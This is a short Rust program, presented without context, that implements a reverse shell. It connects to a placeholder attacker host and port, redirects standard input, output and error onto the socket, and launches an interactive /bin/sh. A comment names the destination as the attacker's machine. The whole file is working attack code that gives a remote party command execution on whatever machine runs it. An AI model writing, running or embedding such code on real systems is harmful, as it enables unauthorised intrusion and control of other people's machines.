use std::net::TcpStream;
use std::process::{Command, Stdio};
use nix::unistd::{dup2}; // For file descriptor duplication
use std::os::unix::io::AsRawFd;

fn main() -> std::io::Result<()> {
    // Connect to the attacker's machine
    let stream = TcpStream::connect("ATTACKER_IP:ATTACKER_PORT")?;
    
    // Duplicate the file descriptors for stdin, stdout, and stderr
    let fd = stream.as_raw_fd();
    dup2(fd, 0)?; // stdin
    dup2(fd, 1)?; // stdout
    dup2(fd, 2)?; // stderr
    
    // Execute the shell
    Command::new("/bin/sh")
        .arg("-i") // Interactive mode
        .stdin(Stdio::inherit())
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit())
        .spawn()?
        .wait()?;

    Ok(())
}

